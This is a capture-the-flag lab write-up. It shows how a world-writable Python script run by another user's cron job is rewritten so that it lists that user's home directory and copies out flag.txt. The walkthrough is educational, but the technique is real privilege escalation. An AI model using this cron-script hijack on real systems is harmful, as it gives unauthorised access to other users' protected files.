# Sysadmin part 8 - Challenge 147

There is some backup files in /backup that we have access to:

```
morpheus@forensics:~$ ls -l /backup
total 84
-rwxrwxr-x 1 root root 40960 Mar 12  2014 3dab3277410dddca016834f91d172027
-rwxrwxr-x 1 root root 10240 Mar 12  2014 776d27d2a429e63bbc3cb29183417bb2
-rwxrwxr-x 1 root root 20480 Mar 14  2014 c074fa6ec17bb35e168366c43cf4cd19
-rwxrwxr-x 1 root root 10240 Mar 12  2014 ca584b15ae397a9ad45b1ff267b55796
```

We have write access to /var/tmp so we can extract the files there. In one of those tar's we have a backup of cypher's crontab:

```
morpheus@forensics:/var/tmp/var/spool/cron/crontabs$ cat cypher
# m h  dom mon dow   command
*/3 * * * * python /tmp/Gathering.py
```

The crontab runs off a file to which we have write access to.

```
morpheus@forensics:/var/tmp/tmp$ cat Gathering.py
import os
os.system("ps aux > /home/cypher/info.txt")
```

So what we'll do is change that file to check what's in cypher's directory:

```
import os
os.system('ls -la /home/cypher > /var/tmp/test')
os.system('chmod 777 /var/tmp/test')
```

After a few minutes, we have a /var/tmp/test that contains the output from `ls`

```
morpheus@forensics:/var/tmp$ cat test
total 48
drwxr-x---  2 cypher cypher 4096 Mar 16  2014 .
drwxr-xr-x 10 root   root   4096 Jun 12  2014 ..
-rw-------  1 root   root      1 Mar 12  2014 .bash_history
-rw-r-----  1 cypher cypher  220 Dec 29  2012 .bash_logout
-rw-r-----  1 cypher cypher 3414 Mar  4  2014 .bashrc
-rwxr-x---  1 cypher cypher  177 Mar 16  2014 cronjob.sh
-rw-r-----  1 cypher cypher   52 Mar 12  2014 flag.txt
-rwxrwxrwt  1 cypher cypher 8726 Mar 24 01:30 info.txt
-rw-r-----  1 cypher cypher  675 Dec 29  2012 .profile
-rw-r-----  1 cypher cypher   19 Mar  4  2014 .vimrc
```

We'll edit Gathering.py again and cat flag.txt, getting the following:

```
morpheus@forensics:/var/tmp$ cat test
BASE ?
RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=
```

Base64 decode it and bingo!
